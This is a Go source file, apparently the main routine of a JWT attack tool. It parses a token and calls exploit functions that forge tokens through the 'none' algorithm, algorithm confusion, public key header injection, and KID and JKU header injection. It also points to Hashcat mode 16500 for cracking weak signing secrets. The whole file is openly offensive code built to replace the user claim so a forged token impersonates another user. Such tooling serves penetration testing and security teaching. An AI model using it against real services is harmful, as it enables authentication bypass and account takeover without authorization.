package attacks

import (
	"JWTechniques/ctrl"
	"fmt"
	"strings"

	"github.com/golang-jwt/jwt/v5"
)

func MainMagic(jwtStr string, userHeader string, userValue string, publicKey string, url string) {

	token := ctrl.StringToToken(jwtStr)

	if token == nil {
		fmt.Print("Error : Unable to parse the JWT\n")
		return
	}

	//TODO : check if the payload to modify is a boolean
	if userHeader == "" {
		if claims, ok := token.Claims.(jwt.MapClaims); ok {

			if _, ok := claims["user"]; ok {
				userHeader = "user"
			} else if _, ok := claims["username"]; ok {
				userHeader = "username"
			} else {
				fmt.Print("The name of the \"user\" header is unknown\nThe tool will only generate tokens without modifying the \"user\" header\n\n")
				fmt.Print("------------------------------------------------------\n\n")
			}
		}
	}

	//The token should always contains the "alg" header, but we check nevertheless
	if alg, ok := token.Header["alg"]; ok {
		fmt.Print("Checking if the token is vulnerable to the \"none algorithm\" attack\n\n")
		newJWTStr := ExploitNoneAlgo(token, userHeader, userValue)
		if newJWTStr != "" {
			fmt.Printf("None algorithm : %s\n\n", newJWTStr)
		}
		fmt.Print("------------------------------------------------------\n\n")
		fmt.Print("You can use Hashcat with the mode 16500 to verify if the JWT is signed with a weak secret\n\n")
		fmt.Print("------------------------------------------------------\n\n")

		//Check if the algo used is an asymmetric algorithm, which can possibly lead to "Algorithm Confusion" and "Public Key Header Injection" attacks
		algStr := strings.ToLower(alg.(string))
		if algStr[0:2] != "hs" {
			fmt.Print("Checking if the token is vulnerable to the \"Public Key Header Injection\" attack\n\n")
			newJWTStr = ExploitPublicKeyInjection(token, userHeader, userValue, algStr)
			if newJWTStr != "" {
				fmt.Printf("Algorithm Confusion : %s\n\n", newJWTStr)
			}
			fmt.Print("------------------------------------------------------\n\n")

			//If a file with a public key is provided, generate a token that may exploit the "Algorithm confusion" vuln
			if publicKey != "" {
				fmt.Print("Checking if the token is vulnerable to the \"Algorithm Confusion\" attack\n\n")
				newJWTStr := ExploitAlgoConfusion(token, userHeader, userValue, algStr, publicKey)
				if newJWTStr != "" {
					fmt.Printf("Algorithm Confusion : %s\n\n", newJWTStr)
					fmt.Print("------------------------------------------------------\n\n")
				}
			}
		}
	}

	if _, ok := token.Header["kid"]; ok {
		fmt.Print("Your token contains the \"KID\" header, it may be exploitable through header injection\n\n")
		newJWTStr := ExploitKID(token)
		if newJWTStr != "" {
			fmt.Printf("KID header injection : %s\n", newJWTStr)
		}
		fmt.Print("------------------------------------------------------\n\n")
	}

	if _, ok := token.Header["jku"]; ok {
		fmt.Print("Your token contains the \"JKU\" header, it may be exploitable through header injection\n")
		if url != "" {
			newJWTStr, err := ExploitJKU(token, userHeader, userValue, url, false)
			if err == nil {
				fmt.Printf("JKU header injection  : %s\n\n", newJWTStr)
			} else {
				fmt.Printf("Error while trying to exploit the \"JKU injection\" attack : %s\n", err)
			}
		} else {
			fmt.Printf("For this attack to work, you should provide an URL (with -u) from which the victim can fetch a file\n")
		}

		fmt.Print("------------------------------------------------------\n\n")
	}

}
